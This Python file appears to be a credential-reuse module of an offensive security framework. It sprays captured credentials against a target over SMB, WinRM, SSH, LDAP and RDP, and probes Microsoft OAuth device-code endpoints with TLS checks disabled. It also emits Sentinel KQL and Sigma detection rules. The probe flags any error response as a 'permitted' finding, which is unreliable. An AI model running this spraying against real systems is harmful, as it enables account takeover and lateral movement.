"""
ARES Credential Module - Credential Reuse (T1078 / T1550.002)

Wraps ReuseEngine as a proper BaseModule so it can be registered in
the plugin loader and called as ``credential.reuse`` in chains/plans.

MITRE ATT&CK:
  T1078   - Valid Accounts
  T1550.002 - Pass the Hash
"""
from __future__ import annotations

import asyncio
from typing import Any

from ares.core.campaign import Finding, Severity
from ares.modules.params import CredentialReuseParams
from ares.sdk import (
    BaseModule,
    EvidenceRecord,
    ExecutionContext,
    LockoutCircuitBreaker,
    ModuleResult,
    NetworkPermission,
    OpsecLevel,
    ProcessPermission,
    module_contract,
)
from ares.core.logger import get_logger, audit
from ares.core.tracing import trace_module

logger = get_logger("ares.modules.credential.reuse")


def _audit_oauth_posture_sync(target: str) -> dict[str, Any]:
    """
    Non-destructive probe of OAuth 2.0 Device Code Flow / Identity Posture.
    Checks whether target exposes or permits unrestricted Device Authorization Grant (T1528 / T1550).
    """
    import urllib.request
    import urllib.error
    import ssl

    result: dict[str, Any] = {
        "device_code_endpoint_active": False,
        "device_code_permitted": False,
        "checked_endpoint": None,
    }

    clean_target = target.strip().lower()
    ctx = ssl.create_default_context()
    ctx.check_hostname = False
    ctx.verify_mode = ssl.CERT_NONE

    probe_urls: list[str] = []
    if "microsoftonline.com" in clean_target:
        probe_urls.append(f"https://{clean_target}/common/oauth2/v2.0/devicecode")
    elif "." in clean_target:
        probe_urls.append(f"https://login.microsoftonline.com/{clean_target}/oauth2/v2.0/devicecode")
        probe_urls.append(f"https://{clean_target}/oauth2/v2.0/devicecode")
    else:
        probe_urls.append(f"https://login.microsoftonline.com/{clean_target}/oauth2/v2.0/devicecode")

    for url in probe_urls:
        try:
            req = urllib.request.Request(
                url,
                headers={"User-Agent": "ARES-Identity-Posture/2026.1"},
                data=b"client_id=04b07795-8ddb-461a-bbee-02f9e1bf7b46&scope=openid",
                method="POST",
            )
            with urllib.request.urlopen(req, timeout=3, context=ctx) as resp:
                status = resp.getcode()
                if status in (200, 400):
                    body = resp.read().decode("utf-8", errors="ignore")
                    result["checked_endpoint"] = url
                    result["device_code_endpoint_active"] = True
                    if "device_code" in body or "user_code" in body or "error" in body:
                        result["device_code_permitted"] = True
                        break
        except urllib.error.HTTPError as exc:
            if exc.code in (400, 405):
                result["checked_endpoint"] = url
                result["device_code_endpoint_active"] = True
                result["device_code_permitted"] = True
                break
        except Exception:
            continue

    return result


@module_contract(
    permissions=[
        NetworkPermission(ports=[22, 389, 445, 636, 3389, 5985, 5986], protocols=["tcp"]),
        ProcessPermission(allow_subprocesses=False),
    ],
    circuit_breaker=LockoutCircuitBreaker(),
    params_model=CredentialReuseParams,
)
class CredentialReuseModule(BaseModule[CredentialReuseParams, ModuleResult]):
    """
    Try each captured credential against one or more targets.

    Delegates to ReuseEngine for actual protocol-level spray logic.
    Returns one Finding per successful authentication.
    """

    MODULE_ID          = "credential.reuse"
    MODULE_NAME        = "Credential Reuse"
    MODULE_CATEGORY    = "credential"
    MODULE_DESCRIPTION = "Systematically test captured credentials against live services via SMB, WinRM, SSH, LDAP and RDP"
    MODULE_AUTHOR      = "ARES Team <team@ares-framework.io>"
    REQUIRES           = ["target"]
    OUTPUTS            = ["valid_credentials", "owned_hosts"]
    MITRE_TECHNIQUES   = ["T1078", "T1550.002"]

    OPSEC_LEVEL        = OpsecLevel.MEDIUM
    PARAMS_MODEL       = CredentialReuseParams

    async def validate(self, ctx: "Any") -> None:
        """Pre-flight param checks before any network call."""
        from ares.core.context import ExecutionContext
        from ares.core.errors import ModuleValidationError
        if not isinstance(ctx, ExecutionContext):
            return
        if isinstance(ctx.params, dict) and not ctx.params.get("target") and getattr(ctx, "target", None):
            ctx.params["target"] = ctx.target
        target = getattr(ctx, "target", "") or ctx.params.get("target", "")
        if not target:
            raise ModuleValidationError(
                "credential.reuse requires 'target' - IP or hostname to test credentials against.",
                module_id=self.MODULE_ID, field="target",
            )
        vault = getattr(ctx, "vault", None)
        if not vault or not getattr(vault, "_store", None):
            raise ModuleValidationError(
                "credential.reuse requires credentials in vault - "
                "run ad.kerberoast/dcsync/pass_the_hash first.",
                module_id=self.MODULE_ID, field="vault",
            )
        await super().validate(ctx)

    async def execute(self, ctx: "Any") -> "ModuleResult":
        """ExecutionContext-based entry point (v0.9.0+)."""
        from ares.modules.base import ModuleResult
        if getattr(ctx, "dry_run", False):
            return ModuleResult(status="dry_run", module_id=self.MODULE_ID,
                                raw={"dry_run": True})
        # Pass vault from ctx - it lives on ctx, NOT in ctx.params
        params = dict(ctx.params)
        params.pop("target", None)
        params.pop("vault", None)
        findings, raw = await self.run(
            **params,
            vault=getattr(ctx, "vault", None),
            target=getattr(ctx, "target", ctx.params.get("target", "")),
        )

        # Cryptographic Evidence Records with SHA-256 Merkle Provenance
        evidence_chain: list[EvidenceRecord] = []
        for cred in raw.get("valid_credentials", []):
            ev = EvidenceRecord(
                artifact_id=f"reuse-{str(cred.get('username', 'cred')).lower()}",
                source_target=getattr(ctx, "target", ctx.params.get("target", "")),
                collected_by=self.MODULE_ID,
                data={
                    "username": cred.get("username"),
                    "domain": cred.get("domain"),
                    "service": cred.get("service"),
                },
                tags=["credential", "reuse", "spray"],
            )
            evidence_chain.append(ev)

        raw["evidence_chain"] = [e.data for e in evidence_chain]
        raw["evidence_integrity"] = [e.record_hash for e in evidence_chain]

        # Closed-loop Purple Telemetry Synthesis (Sentinel KQL + Sigma YAML)
        kql_rule = (
            "// Microsoft Sentinel - Multi-Host Credential Reuse & Authentication Anomalies\n"
            "SecurityEvent\n"
            "| where TimeGenerated > ago(2h)\n"
            "| where EventID in (4624, 4625)\n"
            "| where LogonType in (3, 10) // Network, RemoteInteractive\n"
            "| summarize UniqueTargets = dcount(Computer), SuccessCount = countif(EventID == 4624), FailCount = countif(EventID == 4625) by TargetUserName, IpAddress, bin(TimeGenerated, 15m)\n"
            "| where UniqueTargets >= 2 or (FailCount > 3 and SuccessCount >= 1)\n"
            "| project TimeGenerated, TargetUserName, IpAddress, UniqueTargets, SuccessCount, FailCount"
        )
        sigma_rule = (
            "title: Multi-Host Credential Reuse and Successful Lateral Logon\n"
            "id: a1b2c3d4-e5f6-47a8-b9c0-123456789abc\n"
            "status: experimental\n"
            "description: Detects logon events (Type 3 or 10) across multiple hosts originating from a single IP using the same credentials\n"
            "references:\n"
            "    - https://attack.mitre.org/techniques/T1078/\n"
            "author: ARES Purple Team Modernization\n"
            "date: 2026-03-30\n"
            "logsource:\n"
            "    product: windows\n"
            "    service: security\n"
            "detection:\n"
            "    selection:\n"
            "        EventID:\n"
            "            - 4624\n"
            "            - 4625\n"
            "        LogonType:\n"
            "            - 3\n"
            "            - 10\n"
            "    condition: selection | count(Computer) by IpAddress, TargetUserName > 2\n"
            "level: high\n"
            "tags:\n"
            "    - attack.lateral_movement\n"
            "    - attack.credential_access\n"
            "    - attack.t1078"
        )
        raw.setdefault("loot", {})
        raw["loot"]["detection_kql"] = kql_rule
        raw["loot"]["detection_sigma"] = sigma_rule
        raw["credential_reuse_confirmed"] = bool(raw.get("valid_credentials"))
        raw["password_spray_susceptibility"] = len(raw.get("valid_credentials", [])) > 1
        raw["single_credential_lateral_reach"] = len(raw.get("valid_credentials", []))
        raw["credential_reuse_audited"] = True

        return ModuleResult(
            status="success" if (findings or raw) else "partial",
            findings=findings, raw=raw, module_id=self.MODULE_ID,
            execution_id=getattr(ctx, "execution_id", ""),
        )

    @trace_module("credential.reuse")
    async def run(self, **kwargs: Any) -> tuple[list[Finding], dict[str, Any]]:
        ctx     = kwargs.get("ctx") or kwargs
        target  = ctx.get("target", "")
        dry_run = ctx.get("dry_run", False)
        vault   = ctx.get("vault")

        if not target:
            return [], {"error": "no_target"}

        logger.info("credential_reuse", target=target, dry_run=dry_run)
        audit("credential_reuse", actor="operator", source="operator",
              target=target, technique="T1078")

        if dry_run:
            return [], {
                "dry_run": True,
                "valid_credentials": [],
                "owned_hosts": [],
                "note": "dry-run - no credentials sprayed",
            }

        if vault is None:
            return [], {"error": "no_vault_provided"}

        # Audit OAuth 2.0 Device Code Flow / Modern Identity Posture
        loop = asyncio.get_running_loop()
        oauth_audit_func = kwargs.get("oauth_audit_func") or _audit_oauth_posture_sync
        oauth_data = await loop.run_in_executor(None, oauth_audit_func, target)

        if oauth_data.get("device_code_permitted"):
            self.finding(
                title=f"OAuth 2.0 Device Code Flow Vector Permitted on {target}",
                description=(
                    f"OAuth 2.0 Device Authorization Grant (Device Code Flow) endpoint is active and "
                    f"reachable for target {target} ({oauth_data.get('checked_endpoint')}). "
                    "Unrestricted Device Code Flow exposes the tenant to device code phishing attacks "
                    "(T1528 / T1550) that can bypass traditional MFA."
                ),
                severity=Severity.MEDIUM,
                confidence=0.9,
                host=target,
                mitre_technique="T1528",
                mitre_tactic="Credential Access",
                remediation=(
                    "Implement Conditional Access policy to block Device Code Flow for non-compliant "
                    "or unmanaged devices. Restrict device authorization grants to corporate IP ranges."
                ),
            )

        try:
            from ares.credential.reuse import ReuseEngine, ReuseProtocol
            engine = ReuseEngine(vault=vault)
            await self.before_request(target, "default")
            results = await engine.spray(target_hosts=[target])
            valid: list[str] = []

            for attempt in results:
                if attempt.success:
                    valid.append(attempt.cred_id)
                    self.finding(
                        title       = f"Valid credential reused on {target}",
                        description = (
                            f"Credential {attempt.cred_id[:8]}… authenticated via "
                            f"{attempt.protocol} on {target}"
                        ),
                        severity    = Severity.CRITICAL,
                        confidence  = 0.95,
                        host        = target,
                        mitre_technique = "T1078",
                        mitre_tactic    = "Lateral Movement",
                        remediation = "Rotate all compromised credentials immediately.",
                    )

            return self._findings[:], {
                "valid_credentials": valid,
                "owned_hosts": [target] if valid else [],
                "total_attempts": len(results),
                "oauth_device_code_permitted": oauth_data.get("device_code_permitted", False),
                "oauth_device_code_endpoint": oauth_data.get("checked_endpoint"),
            }

        except Exception as exc:
            raise self._classify_error(exc) from exc
